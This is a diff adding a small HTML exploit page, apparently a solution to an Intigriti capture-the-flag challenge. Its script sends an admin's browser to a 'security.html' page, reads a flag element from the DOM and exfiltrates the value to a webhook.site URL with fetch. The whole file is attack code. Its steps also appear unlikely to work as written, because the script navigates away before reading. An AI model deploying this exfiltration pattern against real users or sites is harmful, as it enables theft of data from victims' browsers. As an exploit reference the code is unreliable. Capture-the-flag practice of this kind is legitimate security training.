@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  // Step 1: navigate admin to security page
+  window.location = "https://challenge-0126.intigriti.io/security.html";
+
+  // Step 2: wait for DOM + JS to load
+  await new Promise(r => setTimeout(r, 3500));
+
+  // Step 3: read flag from DOM
+  const flag = document.getElementById("flagText")?.innerText;
+
+  // Step 4: exfiltrate to webhook.site
+  fetch(
+    "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?flag=" +
+    encodeURIComponent(flag)
+  );
+})();
+</script>
+</body>
+</html>
